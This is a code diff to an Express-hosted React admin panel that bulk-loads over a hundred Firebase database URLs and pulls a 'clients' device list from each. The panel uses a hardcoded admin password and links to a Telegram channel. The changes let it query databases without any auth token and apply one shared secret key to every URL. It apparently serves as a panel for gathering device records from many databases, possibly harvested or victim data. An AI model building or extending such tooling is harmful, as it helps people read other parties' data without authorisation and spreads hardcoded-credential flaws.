@@ -3,7 +3,7 @@ const app = express();
 const PORT = process.env.PORT || 10000;
 
 // ============================================================
-// YAHAN APNA ADMIN PASSWORD AUR CONFIG SET KAREIN
+// YAHAN APNA ADMIN PASSWORD SET KAREIN
 // ============================================================
 const ADMIN_PASSWORD = "Noobster@2024";
 const TELEGRAM_CHANNEL = "https://t.me/firebase1991";
@@ -86,7 +86,13 @@ const pageHTML = `
         async function fetchFirebase(url, key, path) {
             let u = url.trim().replace(/\\/$/, "");
             if (!u.startsWith("http")) u = "https://" + u;
-            const res = await fetch(u + "/" + path + ".json?auth=" + key.trim());
+            
+            let fetchUrl = u + "/" + path + ".json";
+            if (key && key.trim() !== "") {
+                fetchUrl += "?auth=" + key.trim();
+            }
+            
+            const res = await fetch(fetchUrl);
             if (!res.ok) {
                 if (res.status === 401 || res.status === 403) throw new Error("PERMISSION_DENIED");
                 throw new Error("HTTP_" + res.status);
@@ -203,7 +209,11 @@ const pageHTML = `
             const [devices, setDevices] = useState([]);
             const [loading, setLoading] = useState(false);
             const [search, setSearch] = useState("");
-            const [bulkText, setBulkText] = useState("");
+            
+            // Bulk State
+            const [bulkUrls, setBulkUrls] = useState("");
+            const [bulkKey, setBulkKey] = useState("");
+            
             const [newApiName, setNewApiName] = useState("");
             const [newApiKey, setNewApiKey] = useState("");
             const [broadcastMsg, setBroadcastMsg] = useState(status.broadcast || "");
@@ -217,23 +227,22 @@ const pageHTML = `
             const loadDevices = useCallback(async (silent = false) => {
                 if (!silent) setLoading(true);
                 const currentAccs = DB.get(KEYS.firebaseAccs, []);
-                let allDevs = [], failedAccs = [], counts = {};
+                let allDevs = [], counts = {};
+                
                 await Promise.all(currentAccs.map(async (acc) => {
                     try {
                         const data = await fetchFirebase(acc.url, acc.key, "clients");
                         const devs = parseDevices(data);
                         devs.forEach(d => { d._accountName = acc.name || "Firebase"; });
                         allDevs.push(...devs); counts[acc.id] = devs.length;
-                    } catch { failedAccs.push(acc.id); counts[acc.id] = 0; }
+                    } catch { 
+                        counts[acc.id] = 0; 
+                    }
                 }));
-                if (failedAccs.length > 0) {
-                    const filtered = currentAccs.filter(a => !failedAccs.includes(a.id));
-                    saveAccs(filtered);
-                    if (!silent) toast.push(failedAccs.length + " dead Firebase accounts removed", "error");
-                }
+                
                 setDevices(allDevs); setPerAccCount(counts);
                 if (!silent) setLoading(false);
-            }, [toast]);
+            }, []);
 
             useEffect(() => {
                 loadDevices();
@@ -242,20 +251,30 @@ const pageHTML = `
             }, [loadDevices]);
 
             const handleBulkAdd = async () => {
-                const lines = bulkText.split("\\n").map(l => l.trim()).filter(Boolean);
-                if (lines.length === 0) return toast.push("Paste Firebase URLs + keys", "error");
+                const lines = bulkUrls.split("\\n").map(l => l.trim()).filter(Boolean);
+                if (lines.length === 0) return toast.push("Paste Firebase URLs", "error");
+                if (!bulkKey.trim()) return toast.push("Paste the Secret Key", "error");
+                
                 let newAccs = [];
-                for (const line of lines) {
-                    const parts = line.split(/[|,;\\t]/).map(p => p.trim());
-                    if (parts.length >= 2) {
-                        let url = parts[0];
-                        if (!url.startsWith("http")) url = "https://" + url;
-                        newAccs.push({ id: Date.now() + Math.random(), name: parts[2] || url.split("//")[1].split(".")[0], url, key: parts[1] });
-                    }
+                let usedNames = new Set(accs.map(a => a.name));
+
+                for (const url of lines) {
+                    if (!url.startsWith("http")) continue;
+                    let name = url.split("//")[1].split(".")[0];
+                    if (usedNames.has(name)) name = name + "-" + Math.floor(Math.random()*1000);
+                    usedNames.add(name);
+
+                    newAccs.push({ 
+                        id: Date.now() + Math.random(), 
+                        name: name, 
+                        url: url, 
+                        key: bulkKey.trim() 
+                    });
                 }
+                
                 if (newAccs.length > 0) {
                     saveAccs([...accs, ...newAccs]);
-                    setBulkText("");
+                    setBulkUrls(""); setBulkKey("");
                     toast.push(newAccs.length + " Firebases Added!", "success");
                     loadDevices();
                 }
@@ -320,14 +339,20 @@ const pageHTML = `
                                 React.createElement("div", { style: { fontSize: "10px", color: "#555", marginTop: "8px" } }, "Source: " + d._accountName)
                             ))
                         ),
-                        filteredDevices.length === 0 && React.createElement(EmptyState, { message: search ? "No devices match your search" : "No devices loaded" })
+                        filteredDevices.length === 0 && React.createElement(EmptyState, { message: search ? "No devices match your search" : "No devices loaded (Check Keys)" })
                     ),
                     tab === "bulk_firebase" && React.createElement("div", { className: "fade-in" },
                         React.createElement("div", { className: "card", style: { marginBottom: "16px" } },
-                            React.createElement("h2", { style: { fontSize: "16px", marginBottom: "10px" } }, "Bulk Add Firebase (100+)"),
-                            React.createElement("p", { style: { fontSize: "12px", color: "#666", marginBottom: "16px" } }, "Format: URL | KEY | NAME (One per line)"),
-                            React.createElement("textarea", { className: "input", rows: 8, value: bulkText, onChange: e => setBulkText(e.target.value), placeholder: "https://app1.firebaseio.com | SECRET_KEY | App 1", style: { fontFamily: "monospace" } }),
-                            React.createElement("button", { className: "btn btn-primary", onClick: handleBulkAdd, style: { marginTop: "16px" } }, "Save & Load Firebases")
+                            React.createElement("h2", { style: { fontSize: "16px", marginBottom: "10px" } }, "Bulk Add Firebase (URLs + 1 Key)"),
+                            React.createElement("p", { style: { fontSize: "12px", color: "#666", marginBottom: "16px" } }, "Paste all URLs below, and enter the secret key. The key will be applied to all URLs."),
+                            
+                            React.createElement("label", { style: { fontSize: "12px", color: "#aaa", display: "block", marginBottom: "6px" } }, "1. Firebase URLs (One per line)"),
+                            React.createElement("textarea", { className: "input", rows: 6, value: bulkUrls, onChange: e => setBulkUrls(e.target.value), placeholder: "https://app1.firebaseio.com\\nhttps://app2.firebaseio.com", style: { fontFamily: "monospace", marginBottom: "12px" } }),
+                            
+                            React.createElement("label", { style: { fontSize: "12px", color: "#aaa", display: "block", marginBottom: "6px" } }, "2. Secret Key (Applied to all)"),
+                            React.createElement("input", { className: "input", value: bulkKey, onChange: e => setBulkKey(e.target.value), placeholder: "Enter Secret Key Here (Auth Token)", style: { fontFamily: "monospace", marginBottom: "16px" } }),
+                            
+                            React.createElement("button", { className: "btn btn-primary", onClick: handleBulkAdd }, "Save & Load Firebases")
                         ),
                         React.createElement("div", { className: "card" },
                             React.createElement("h3", { style: { fontSize: "14px", marginBottom: "12px" } }, "Active Firebases (" + accs.length + ")"),
